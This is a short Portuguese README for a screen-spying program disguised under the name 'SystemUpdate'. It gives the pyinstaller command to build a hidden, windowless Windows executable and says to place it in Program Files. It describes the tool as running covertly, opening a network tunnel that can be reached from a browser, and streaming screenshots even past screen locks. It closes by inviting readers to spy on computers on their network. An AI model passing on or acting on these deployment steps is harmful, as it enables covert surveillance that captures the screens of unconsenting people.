Esse é um programa de espionagem de máquina
Criado por Freitas01

Uma vez baixado o código python,
instale as dependencias necessárias

Execute o comando no console

pyinstaller --onefile --noconsole SystemUpdate.py

Para gerar o executavel EXE para windows.
uma vez criado, mova-o para C:\Program Files\

Ele irá rodar perfeitamente, criara um tunel dentro de sua rede wifi e poderá ser acessado
via browser. Sinta-se a vontade para fazer ajustes caso necessario.

Lembre-se ao executar ele ficara rodando de maneira oculta, então para fechar o programa
aperte CTRL + ALT + DEL

A estrutura dele foi realizada parar transmissão de prints, temporários, que funcionam para
verificar o conteúdo da tela, inclusive quebrando a segurança de bloqueadores de tela, de
maneira intermitente. Mas funciona bem para a finalidade.

Se quer brincar de espionar os computadores da rede voce vai se divertir!
faça bom uso, com moderaçao
